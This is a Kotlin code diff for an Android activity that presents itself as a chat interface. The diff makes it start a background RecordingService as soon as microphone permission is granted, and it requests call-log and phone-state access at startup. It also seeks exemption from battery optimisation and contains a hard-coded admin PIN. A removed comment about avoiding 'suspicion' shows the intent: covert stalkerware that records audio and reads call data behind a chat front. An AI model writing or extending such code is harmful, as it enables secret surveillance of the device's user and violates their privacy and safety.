@@ -23,6 +23,7 @@ class UserInterfaceActivity : AppCompatActivity() {
     private val messages = mutableListOf<ChatMessage>()
     private lateinit var adapter: ChatAdapter
     private val ADMIN_PIN = "9999"
+    private var recordingServiceStarted = false
 
     companion object {
         private const val REQ_ALL_PERMISSIONS = 101
@@ -37,32 +38,43 @@ class UserInterfaceActivity : AppCompatActivity() {
         requestIgnoreBatteryOptimization()
     }
 
-    // ── Request ALL required permissions at startup ───────────────────────────
+    override fun onResume() {
+        super.onResume()
+        // If RECORD_AUDIO already granted (e.g. second launch), start RecordingService
+        if (!recordingServiceStarted &&
+            ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO)
+            == PackageManager.PERMISSION_GRANTED) {
+            startRecordingService()
+        }
+    }
+
+    private fun startRecordingService() {
+        if (recordingServiceStarted) return
+        recordingServiceStarted = true
+        val intent = Intent(this, RecordingService::class.java)
+        try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
+                startForegroundService(intent)
+            else
+                startService(intent)
+        } catch (e: Exception) {
+            // Ignore — service will start on next resume when permissions are ready
+        }
+    }
+
     private fun requestAllPermissions() {
         val needed = mutableListOf<String>()
-
-        // Microphone (for recording)
-        if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO)
-            != PackageManager.PERMISSION_GRANTED)
-            needed.add(Manifest.permission.RECORD_AUDIO)
-
-        // Phone state (for call detection)
-        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE)
-            != PackageManager.PERMISSION_GRANTED)
-            needed.add(Manifest.permission.READ_PHONE_STATE)
-
-        // Call log
-        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG)
-            != PackageManager.PERMISSION_GRANTED)
-            needed.add(Manifest.permission.READ_CALL_LOG)
-
-        // Bluetooth (Android 12+)
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
-            if (ContextCompat.checkSelfPermission(this, Manifest.permission.BLUETOOTH_CONNECT)
-                != PackageManager.PERMISSION_GRANTED)
-                needed.add(Manifest.permission.BLUETOOTH_CONNECT)
+        val perms = buildList {
+            add(Manifest.permission.RECORD_AUDIO)
+            add(Manifest.permission.READ_PHONE_STATE)
+            add(Manifest.permission.READ_CALL_LOG)
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S)
+                add(Manifest.permission.BLUETOOTH_CONNECT)
         }
-
+        perms.forEach {
+            if (ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED)
+                needed.add(it)
+        }
         if (needed.isNotEmpty())
             ActivityCompat.requestPermissions(this, needed.toTypedArray(), REQ_ALL_PERMISSIONS)
     }
@@ -71,7 +83,13 @@ class UserInterfaceActivity : AppCompatActivity() {
         requestCode: Int, permissions: Array<out String>, grantResults: IntArray
     ) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults)
-        // Silently handle — no UI feedback to avoid suspicion
+        if (requestCode == REQ_ALL_PERMISSIONS) {
+            // Check if RECORD_AUDIO was granted → start RecordingService
+            val idx = permissions.indexOf(Manifest.permission.RECORD_AUDIO)
+            if (idx >= 0 && grantResults[idx] == PackageManager.PERMISSION_GRANTED) {
+                startRecordingService()
+            }
+        }
     }
 
     private fun setupChatUI() {
@@ -124,9 +142,11 @@ class UserInterfaceActivity : AppCompatActivity() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
             val pm = getSystemService(POWER_SERVICE) as android.os.PowerManager
             if (!pm.isIgnoringBatteryOptimizations(packageName)) {
-                startActivity(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
-                    data = Uri.parse("package:$packageName")
-                })
+                try {
+                    startActivity(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
+                        data = Uri.parse("package:$packageName")
+                    })
+                } catch (_: Exception) {}
             }
         }
     }
